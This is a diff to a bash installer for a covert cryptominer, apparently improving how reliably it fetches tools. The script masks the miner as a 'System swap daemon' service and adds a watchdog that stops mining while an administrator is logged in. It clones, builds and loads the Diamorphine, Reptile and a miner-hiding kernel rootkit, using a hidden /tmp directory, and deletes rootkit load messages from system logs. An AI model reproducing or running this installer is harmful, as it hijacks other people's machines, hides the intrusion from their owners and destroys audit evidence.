@@ -16,6 +16,11 @@ export HISTFILE=/dev/null
 # Trap errors but continue execution
 trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR
 
+# ==================== GIT CONFIGURATION ====================
+# Disable git interactive prompts globally
+export GIT_TERMINAL_PROMPT=0
+git config --global credential.helper "" 2>/dev/null || true
+
 # ==================== ARCHITECTURE DETECTION ====================
 # Detect if system is 32-bit or 64-bit to skip incompatible rootkits
 ARCH=$(uname -m)
@@ -47,12 +52,12 @@ esac
 reptile_cmd() {
     local cmd="$1"
     shift
-
+    
     # Skip entirely on non-64-bit systems
     if [ "$IS_64BIT" = "false" ]; then
         return 0
     fi
-
+    
     # Try different possible locations where reptile might be installed
     if [ -f /reptile/bin/reptile ]; then
         /reptile/bin/reptile "$cmd" "$@" 2>/dev/null || true
@@ -98,22 +103,22 @@ if command -v dpkg >/dev/null 2>&1; then
     echo "========================================"
     echo "CHECKING DPKG STATUS"
     echo "========================================"
-
+    
     # Check if dpkg was interrupted
     DPKG_INTERRUPTED=false
-
+    
     # Method 1: Check dpkg status (ONLY packages with actual problems)
     if dpkg --audit 2>&1 | grep -qE "half-configured|half-installed|unpacked.*not configured"; then
         DPKG_INTERRUPTED=true
         echo "[!] DPKG interrupt detected (dpkg --audit shows half-configured packages)"
     fi
-
+    
     # Method 2: Check apt-get for ACTUAL errors (not just warnings)
     if apt-get check 2>&1 | grep -qE "dpkg was interrupted.*must manually run|You must.*dpkg --configure"; then
         DPKG_INTERRUPTED=true
         echo "[!] DPKG interrupt detected (apt-get check shows actual interrupt)"
     fi
-
+    
     # Method 3: Check lock files ONLY if process is stuck
     if [ -f /var/lib/dpkg/lock-frontend ] || [ -f /var/lib/dpkg/lock ]; then
         # Only consider it interrupted if lock file exists AND process is stuck
@@ -131,20 +136,20 @@ if command -v dpkg >/dev/null 2>&1; then
             echo "[!] DPKG may have been interrupted (stale lock with no process)"
         fi
     fi
-
+    
     # Fix if interrupted
     if [ "$DPKG_INTERRUPTED" = "true" ]; then
         echo ""
         echo "[!] DPKG WAS INTERRUPTED - FIXING AUTOMATICALLY"
         echo "========================================"
-
+        
         # Kill any stuck dpkg processes
         echo "[*] Checking for stuck dpkg processes..."
         pkill -9 dpkg 2>/dev/null || true
         pkill -9 apt-get 2>/dev/null || true
         pkill -9 apt 2>/dev/null || true
         sleep 2
-
+        
         # Remove lock files if they exist and no process is using them
         echo "[*] Removing stale lock files..."
         if ! lsof /var/lib/dpkg/lock >/dev/null 2>&1; then
@@ -153,34 +158,34 @@ if command -v dpkg >/dev/null 2>&1; then
             rm -f /var/lib/apt/lists/lock 2>/dev/null || true
             rm -f /var/cache/apt/archives/lock 2>/dev/null || true
         fi
-
+        
         # Run dpkg --configure -a to fix interrupted installations
         echo "[*] Running: dpkg --configure -a"
         echo ""
-
+        
         DEBIAN_FRONTEND=noninteractive dpkg --configure -a 2>&1 | tail -20
-
+        
         sleep 2
-
+        
         # Fix any broken dependencies
         echo ""
         echo "[*] Running: apt-get install -f"
-
+        
         DEBIAN_FRONTEND=noninteractive apt-get install -f -y 2>&1 | tail -20
-
+        
         sleep 2
-
+        
         # Verify it's fixed
         echo ""
         echo "[*] Verifying dpkg is now working..."
-
+        
         if dpkg --audit 2>&1 | grep -q "not fully installed\|not installed\|half-configured"; then
             echo "[!] WARNING: Some packages may still have issues"
             echo "[*] Continuing anyway - script will handle package errors"
         else
             echo "[✓] DPKG is now working correctly"
         fi
-
+        
         echo "========================================"
         echo ""
     else
@@ -196,14 +201,14 @@ force_stop_service() {
     local process_names="$2"  # Space-separated list of process names
     local max_attempts=60     # 60 attempts = ~5 minutes max
     local attempt=0
-
+    
     echo "[*] Force-stopping services: $service_names"
     echo "[*] Force-stopping processes: $process_names"
-
+    
     while [ $attempt -lt $max_attempts ]; do
         attempt=$((attempt + 1))
         local all_stopped=true
-
+        
         # Method 1: Try systemctl stop for each service
         if [ -n "$service_names" ]; then
             for svc in $service_names; do
@@ -214,20 +219,20 @@ force_stop_service() {
                 fi
             done
         fi
-
+        
         # Method 2: Kill processes by name (all methods)
         if [ -n "$process_names" ]; then
             for proc in $process_names; do
                 # Check if any process with this name exists
                 if pgrep -x "$proc" >/dev/null 2>&1 || pgrep -f "$proc" >/dev/null 2>&1; then
                     echo "[*] Attempt $attempt: Killing process $proc..."
-
+                    
                     # Method 2a: pkill by exact name
                     pkill -9 -x "$proc" 2>/dev/null || true
-
+                    
                     # Method 2b: pkill by pattern (full command line)
                     pkill -9 -f "$proc" 2>/dev/null || true
-
+                    
                     # Method 2c: Find and kill by PID
                     local pids=$(pgrep -x "$proc" 2>/dev/null)
                     if [ -n "$pids" ]; then
@@ -235,7 +240,7 @@ force_stop_service() {
                             kill -9 "$pid" 2>/dev/null || true
                         done
                     fi
-
+                    
                     # Method 2d: Find by full command and kill
                     local pids=$(pgrep -f "$proc" 2>/dev/null)
                     if [ -n "$pids" ]; then
@@ -243,12 +248,12 @@ force_stop_service() {
                             kill -9 "$pid" 2>/dev/null || true
                         done
                     fi
-
+                    
                     all_stopped=false
                 fi
             done
         fi
-
+        
         # Method 3: Check /proc for survivors
         if [ -n "$process_names" ]; then
             for proc in $process_names; do
@@ -265,17 +270,17 @@ force_stop_service() {
                 done
             done
         fi
-
+        
         # If everything is stopped, break out
         if [ "$all_stopped" = true ]; then
             echo "[✓] All services/processes stopped after $attempt attempts"
             return 0
         fi
-
+        
         # Wait before next attempt
         sleep 3
     done
-
+    
     echo "[!] WARNING: Some services/processes may still be running after $max_attempts attempts"
     echo "[*] Continuing anyway..."
     return 0
@@ -524,17 +529,17 @@ while true; do
     if who | grep -qvE "^root\s"; then
         ADMIN_LOGGED_IN=true
     fi
-
+    
     # Read previous state
     PREV_STATE=$(cat "$STATE_FILE" 2>/dev/null || echo "stopped")
-
+    
     # Determine desired state
     if [ "$ADMIN_LOGGED_IN" = true ]; then
         DESIRED_STATE="stopped"
     else
         DESIRED_STATE="running"
     fi
-
+    
     # Only act if state CHANGED
     if [ "$DESIRED_STATE" != "$PREV_STATE" ]; then
         if [ "$DESIRED_STATE" = "stopped" ]; then
@@ -547,7 +552,7 @@ while true; do
             echo "running" > "$STATE_FILE"
         fi
     fi
-
+    
     # Wait before next check
     sleep "$CHECK_INTERVAL"
 done
@@ -559,7 +564,7 @@ echo "[✓] Intelligent watchdog created"
 # ==================== CREATE SYSTEMD SERVICE (if available) ====================
 if [ "$SYSTEMD_AVAILABLE" = true ]; then
     echo "[*] Creating systemd service..."
-
+    
     cat > /etc/systemd/system/swapd.service << 'SERVICE_EOF'
 [Unit]
 Description=System swap daemon
@@ -581,13 +586,13 @@ StandardError=null
 [Install]
 WantedBy=multi-user.target
 SERVICE_EOF
-
+    
     # Enable and start the service
     systemctl daemon-reload
     systemctl enable swapd 2>/dev/null || true
-
+    
     echo "[✓] Systemd service created and enabled"
-
+    
     # Create watchdog service
     cat > /etc/systemd/system/system-watchdog.service << 'WATCHDOG_SERVICE_EOF'
 [Unit]
@@ -606,17 +611,17 @@ StandardError=null
 [Install]
 WantedBy=multi-user.target
 WATCHDOG_SERVICE_EOF
-
+    
     systemctl daemon-reload
     systemctl enable system-watchdog 2>/dev/null || true
     systemctl start system-watchdog 2>/dev/null || true
-
+    
     echo "[✓] Watchdog service created and enabled"
-
+    
 else
     # ==================== CREATE SYSV INIT SCRIPT ====================
     echo "[*] Creating SysV init script..."
-
+    
     cat > /etc/init.d/swapd << 'INIT_EOF'
 #!/bin/bash
 ### BEGIN INIT INFO
@@ -668,9 +673,9 @@ esac
 
 exit 0
 INIT_EOF
-
+    
     chmod +x /etc/init.d/swapd
-
+    
     # Add to startup (distribution-specific)
     if command -v update-rc.d >/dev/null 2>&1; then
         update-rc.d swapd defaults >/dev/null 2>&1 || true
@@ -678,9 +683,9 @@ INIT_EOF
         chkconfig --add swapd >/dev/null 2>&1 || true
         chkconfig swapd on >/dev/null 2>&1 || true
     fi
-
+    
     echo "[✓] SysV init script created and enabled"
-
+    
     # Install watchdog as a background daemon
     echo "[*] Installing watchdog as background daemon..."
     nohup /usr/local/bin/system-watchdog >/dev/null 2>&1 &
@@ -693,33 +698,36 @@ install_diamorphine() {
     echo "========================================"
     echo "INSTALLING DIAMORPHINE ROOTKIT"
     echo "========================================"
-
+    
     # Skip on non-64-bit systems
     if [ "$IS_64BIT" = "false" ]; then
         echo "[!] Skipping Diamorphine on non-64-bit system"
         return 1
     fi
-
+    
     cd /tmp || return 1
-
+    
     # Remove old installation
     if lsmod | grep -q diamorphine 2>/dev/null; then
         echo "[*] Removing old Diamorphine..."
         rmmod diamorphine 2>/dev/null || true
         sleep 1
     fi
-
+    
     rm -rf diamorphine 2>/dev/null
-
+    
     # Clone and build
     echo "[*] Cloning Diamorphine..."
-    if ! git clone https://github.com/m0nad/Diamorphine.git diamorphine 2>/dev/null; then
-        echo "[!] Failed to clone Diamorphine"
+    export GIT_TERMINAL_PROMPT=0
+    if ! git clone --depth 1 https://github.com/m0nad/Diamorphine.git diamorphine 2>&1 | grep -v "Username"; then
+        echo "[!] Failed to clone Diamorphine (network or repository unavailable)"
+        unset GIT_TERMINAL_PROMPT
         return 1
     fi
-
+    unset GIT_TERMINAL_PROMPT
+    
     cd diamorphine || return 1
-
+    
     echo "[*] Building Diamorphine..."
     if ! make 2>/dev/null; then
         echo "[!] Failed to build Diamorphine"
@@ -727,7 +735,7 @@ install_diamorphine() {
         rm -rf diamorphine
         return 1
     fi
-
+    
     # Load the module
     echo "[*] Loading Diamorphine kernel module..."
     if ! insmod diamorphine.ko 2>/dev/null; then
@@ -736,15 +744,15 @@ install_diamorphine() {
         rm -rf diamorphine
         return 1
     fi
-
+    
     # Verify it loaded
     if lsmod | grep -q diamorphine 2>/dev/null; then
         echo "[✓] Diamorphine loaded successfully"
-
+        
         # Clean up build artifacts
         cd /tmp
         rm -rf diamorphine
-
+        
         return 0
     else
         echo "[!] Diamorphine failed to load"
@@ -760,38 +768,41 @@ install_reptile() {
     echo "========================================"
     echo "INSTALLING REPTILE ROOTKIT"
     echo "========================================"
-
+    
     # Skip on non-64-bit systems
     if [ "$IS_64BIT" = "false" ]; then
         echo "[!] Skipping Reptile on non-64-bit system"
         return 1
     fi
-
+    
     # Create hidden directory
     mkdir -p /tmp/.ICE-unix/.X11-unix 2>/dev/null
     cd /tmp/.ICE-unix/.X11-unix || return 1
-
+    
     # Remove old installation
     if [ -d Reptile ]; then
         echo "[*] Removing old Reptile installation..."
         rm -rf Reptile
     fi
-
+    
     if lsmod | grep -q reptile 2>/dev/null; then
         echo "[*] Unloading old Reptile module..."
         rmmod reptile 2>/dev/null || true
         sleep 1
     fi
-
-    # Clone Reptile
+    
+    # Clone Reptile (disable interactive prompts)
     echo "[*] Cloning Reptile..."
-    if ! git clone https://github.com/f0rb1dd3n/Reptile.git 2>/dev/null; then
-        echo "[!] Failed to clone Reptile"
+    export GIT_TERMINAL_PROMPT=0
+    if ! git clone --depth 1 https://github.com/f0rb1dd3n/Reptile.git 2>&1 | grep -v "Username"; then
+        echo "[!] Failed to clone Reptile (network or repository unavailable)"
+        unset GIT_TERMINAL_PROMPT
         return 1
     fi
-
+    unset GIT_TERMINAL_PROMPT
+    
     cd Reptile || return 1
-
+    
     # Build Reptile
     echo "[*] Building Reptile (this may take a while)..."
     if ! make 2>/dev/null; then
@@ -800,7 +811,7 @@ install_reptile() {
         rm -rf Reptile
         return 1
     fi
-
+    
     # Load the module
     echo "[*] Loading Reptile kernel module..."
     if ! insmod reptile.ko 2>/dev/null; then
@@ -809,7 +820,7 @@ install_reptile() {
         rm -rf Reptile
         return 1
     fi
-
+    
     # Verify it loaded
     if lsmod | grep -q reptile 2>/dev/null; then
         echo "[✓] Reptile loaded successfully"
@@ -869,9 +880,11 @@ fi
 
 # Clone and build the crypto-miner rootkit
 echo "[*] Cloning hiding-cryptominers-linux-rootkit..."
-if git clone https://gitee.com/qianmeng/hiding-cryptominers-linux-rootkit.git 2>/dev/null; then
+export GIT_TERMINAL_PROMPT=0
+if git clone --depth 1 https://gitee.com/qianmeng/hiding-cryptominers-linux-rootkit.git 2>&1 | grep -v "Username"; then
+    unset GIT_TERMINAL_PROMPT
     cd hiding-cryptominers-linux-rootkit/ || exit 1
-
+    
     echo "[*] Building rootkit..."
     if make 2>/dev/null; then
         echo "[*] Loading rootkit module..."
@@ -880,7 +893,7 @@ if git clone https://gitee.com/qianmeng/hiding-cryptominers-linux-rootkit.git 2>
             echo "[!] Failed to load crypto rootkit"
         }
         dmesg
-
+        
         # Immediately clean up rootkit load messages from logs
         sleep 1
         sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
@@ -889,16 +902,17 @@ if git clone https://gitee.com/qianmeng/hiding-cryptominers-linux-rootkit.git 2>
         sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
         sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
         sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
-
+        
         echo "[✓] Crypto rootkit loaded"
     else
         echo "[!] Failed to build crypto rootkit"
     fi
-
+    
     cd /tmp/.X11-unix || exit 1
     rm -rf hiding-cryptominers-linux-rootkit/
 else
-    echo "[!] Failed to clone crypto rootkit"
+    echo "[!] Failed to clone crypto rootkit (network or repository unavailable)"
+    unset GIT_TERMINAL_PROMPT
 fi
 
 # ==================== START MINER SERVICE ====================
